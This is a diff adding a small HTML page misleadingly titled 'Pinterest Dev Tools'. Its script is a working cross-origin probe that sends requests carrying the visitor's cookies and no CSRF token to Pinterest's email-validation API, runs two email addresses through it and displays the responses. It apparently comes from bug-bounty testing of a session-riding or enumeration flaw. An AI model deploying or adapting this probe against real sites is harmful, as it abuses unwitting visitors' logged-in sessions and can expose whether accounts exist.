@@ -1,0 +1,22 @@
+<!DOCTYPE html><html><head><title>Pinterest Dev Tools</title></head><body>
+<script>
+// Cross-origin oracle probe: relay GET without X-CSRFToken header (cookie only)
+(async () => {
+  const results = {};
+  const call = async (em) => {
+    const data = encodeURIComponent(JSON.stringify({options:{url:"/v3/email/validation/",data:{email:em}},context:{}}));
+    try {
+      const r = await fetch("https://www.pinterest.com/resource/ApiResource/get/?source_url=%2F&data="+data, {
+        credentials:"include",
+        headers:{"X-Requested-With":"XMLHttpRequest","X-APP-VERSION":"45d1a26","X-Pinterest-AppState":"1","X-Pinterest-PWS-Handler":"www/signup.js"}});
+      const t = await r.text();
+      results[em] = r.status + " " + t.slice(0,200);
+    } catch(e) { results[em] = "ERR " + e.message; }
+  };
+  await call("bughunter333333@gmail.com");
+  await call("zqxwvutsrqponmlk999@gmail.com");
+  document.title = "DONE";
+  window.__results = JSON.stringify(results);
+  document.body.innerText = window.__results;
+})();
+</script></body></html>
